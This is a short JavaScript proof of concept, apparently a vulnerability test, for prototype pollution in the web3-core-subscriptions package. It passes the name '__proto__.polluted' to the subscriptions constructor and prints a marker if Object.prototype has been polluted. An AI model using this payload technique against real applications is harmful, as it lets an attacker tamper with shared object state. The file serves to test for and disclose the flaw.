const { subscriptions } = require("web3-core-subscriptions");
const constructorArg = {
    name: '__proto__.polluted',
    call: 'testCall',
}
new subscriptions(constructorArg).attachToObject({});
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '');